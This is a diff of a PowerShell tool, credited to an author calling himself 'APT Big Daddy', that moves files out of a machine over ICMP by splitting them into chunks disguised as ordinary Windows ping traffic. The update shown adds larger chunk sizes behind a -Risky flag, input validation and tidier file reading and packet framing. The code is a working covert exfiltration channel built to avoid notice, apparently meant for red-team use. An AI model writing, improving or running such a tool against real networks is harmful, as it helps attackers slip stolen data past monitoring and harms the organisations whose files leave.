@@ -1,38 +1,52 @@
 # Author: Dahvid Schloss a.k.a APT Big Daddy
-# Email: dahvid.schloss@echeloncyber.com
+# LinkedIn: https://www.linkedin.com/in/dahvidschloss/
 # Date: 04-03-2024
-# Update: 4-16-2024
-# Patch Notes: Added in a better way of exiting issues so it doesn't close the terminal. Also made it so the script will find the CWD and att it to the file path. 
+# Update: 9-24-2026
+# Patch Notes: 
+# - Updated Parms to have a -Risky flag that will allow someone to break over the normal byte size for what a network MTU may support
+# - Updated Params in Read-FileInChunks and Run-Pilot to validate to a range that can't exceed 65500
+# - Updated Run-Pilot to include a check for the risky flag that limits chunks to a conservative MTU size of 1200. May still fail at scale
+# - Updated Read-FileInChunks to just be more efficient. I never went above the 32byte build hearing others wanted to so I'm fixing that here
 # Description: Designed for transmitting files over ICMP by breaking them into manageable chunks to emulate a windows default ping
 
 Add-Type -AssemblyName System.Net
 Add-Type -AssemblyName System.Net.NetworkInformation
 
-# Function to read file in 32 byte chunks we use 32bytes as the layer 1-3 section of the ICMP packet is 32 bytes and by default microsoft sends ping packets at 64 bytes per packet
 function Read-FileInChunks {
-    param (
-        [string]$FilePath
+    param(
+        [string]$FilePath,
+        [ValidateRange(1, 65500)]
+        [int]$ChunkSize
     )
 
+    $FileStream = $null
+
     try {
-        $Chunks = @()
-        $CWD = $PSScriptRoot
-        $CWDfilePath = Join-Path -Path $CWD -ChildPath $FilePath
+        $Chunks = [System.Collections.Generic.List[byte[]]]::new()
+        $CWDfilePath = Join-Path -Path $PSScriptRoot -ChildPath $FilePath
         $FileStream = [System.IO.File]::OpenRead($CWDfilePath)
-        $Buffer = New-Object byte[] $ChunkSize
-        while ($FileStream.Read($Buffer, 0, $ChunkSize) -gt 0) {
-            $Chunks += , $Buffer.Clone() # Clone buffer to avoid overwriting
+        $Buffer = [byte[]]::new($ChunkSize)
+
+        while (($bytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+            $Chunk = [byte[]]::new($bytesRead)
+            [Array]::Copy($Buffer, $Chunk, $bytesRead)
+            $Chunks.Add($Chunk)
         }
-        $FileStream.Close()
-        return $Chunks
+
+        return ,($Chunks.ToArray())
     }
     catch [System.IO.FileNotFoundException] {
         Write-Host "Error: File '$FilePath' not found."
-        return
+        throw
     }
     catch {
         Write-Host "Error reading file: $_"
-        return
+        throw
+    }
+    finally {
+        if ($null -ne $FileStream) {
+            $FileStream.Dispose()
+        }
     }
 }
 
@@ -42,9 +56,16 @@ Function Run-Pilot{
     param(
         [string]$targetIP = "127.0.0.1",
         [string]$filePath,
+        [ValidateRange(1, 65500)]
         [int]$chunksize = 32,
-        [int]$delay = 0
+        [int]$delay = 0,
+        [switch]$Risky
     )
+
+
+    if ($chunksize -gt 1200 -and -not $Risky) { 
+        throw "Chunk sizes above 1200 require -Risky."
+    }
 
     # Read file in chunks
     try{$chunks = Read-FileInChunks -FilePath $filePath -ChunkSize $chunksize}
@@ -60,17 +81,11 @@ Function Run-Pilot{
     $fileName = [System.IO.Path]::GetFileName($filePath)
     $fileType = [System.IO.Path]::GetExtension($filePath)
     $fileInfo = "FileName: $fileName`nFileType: $fileType`nTotalChunks: $totalChunks"
-    $paddingSize = 64 - [System.Text.Encoding]::ASCII.GetByteCount($fileInfo)
-    if ($paddingSize -gt 0) {
-        $padding = [char]::ToString([char]::MinValue) * $paddingSize  # Padding with null characters
-        $firstPacket = $fileInfo + $padding
-    } else {
-        $firstPacket = $fileInfo.Substring(0, 64)  # Trim if info is too long
-    }
+    $firstPacket = [System.Text.Encoding]::ASCII.GetBytes($fileInfo)
 
     # Send the first packet
     Write-Host -NoNewline "Sending file information... "
-    $response = $icmpPacket.Send($targetIP, 1000, [System.Text.Encoding]::ASCII.GetBytes($firstPacket))
+    $response = $icmpPacket.Send($targetIP, 1000, $firstPacket)
     if ($response.Status -eq "Success") {
         Write-Host "Success"
     } else {
